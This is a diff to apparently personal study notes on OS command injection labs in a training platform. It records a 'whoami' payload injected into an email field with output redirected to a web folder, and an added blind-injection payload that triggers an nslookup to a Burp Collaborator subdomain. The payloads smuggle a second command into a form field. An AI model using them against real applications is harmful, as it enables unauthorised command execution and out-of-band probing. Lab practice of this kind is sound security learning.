@@ -46,5 +46,14 @@ To solve the lab, execute the `whoami` command and retrieve the output.
 solved: 
 1. `email=||whoami>/var/www/images/output.txt||`
 2. GET /image?filename=output.txt HTTP/2
+# lab 4:
+This lab contains a blind OS command injection vulnerability in the feedback function.
 
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
+
+Not-solved reason need for burp pro version.
+
+to solve use : `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
 
